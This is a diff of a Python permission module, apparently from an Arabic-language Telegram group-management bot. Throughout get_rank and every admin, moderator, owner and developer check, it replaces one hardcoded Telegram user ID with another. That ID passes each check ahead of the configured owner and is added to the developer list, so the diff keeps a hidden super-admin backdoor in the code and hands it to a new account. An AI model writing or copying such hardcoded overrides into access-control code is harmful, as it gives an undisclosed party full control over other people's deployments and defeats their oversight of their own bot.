@@ -1,7 +1,7 @@
 from config import *
 import re
 def get_rank(id, cid) -> str:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590:
       return 'Aec🎖️'
    if id == int(Dev_Zaid):
       return 'البوت'
@@ -41,9 +41,9 @@ def get_rank(id, cid) -> str:
       return 'عضو'
 
 def admin_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -65,9 +65,9 @@ def admin_pls(id, cid) -> bool:
       return False
 
 def mod_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -87,9 +87,9 @@ def mod_pls(id, cid) -> bool:
       return False
 
 def owner_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -107,9 +107,9 @@ def owner_pls(id, cid) -> bool:
       return False
 
 def gowner_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -125,9 +125,9 @@ def gowner_pls(id, cid) -> bool:
       return False
 
 def dev_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -141,9 +141,9 @@ def dev_pls(id, cid) -> bool:
       return False
 
 def dev2_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -155,9 +155,9 @@ def dev2_pls(id, cid) -> bool:
       return False
 
 def devp_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(Dev_Zaid):
       return True
@@ -168,9 +168,9 @@ def devp_pls(id, cid) -> bool:
 
 
 def pre_pls(id, cid) -> bool:
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
-   if id == 6646631745 or id == 6646631745:
+   if id == 1910015590 or id == 1910015590:
       return True
    if id == int(r.get(f'{Dev_Zaid}botowner')):
       return True
@@ -196,8 +196,8 @@ def pre_pls(id, cid) -> bool:
    
 def get_devs_br():
    list = []
-   if not int(r.get(f'{Dev_Zaid}botowner')) == 6646631745:
-      list.append(6646631745)
+   if not int(r.get(f'{Dev_Zaid}botowner')) == 1910015590:
+      list.append(1910015590)
    list.append(int(r.get(f'{Dev_Zaid}botowner')))
    if r.smembers(f'{Dev_Zaid}DEV2'):
       for dev2 in r.smembers(f'{Dev_Zaid}DEV2'):
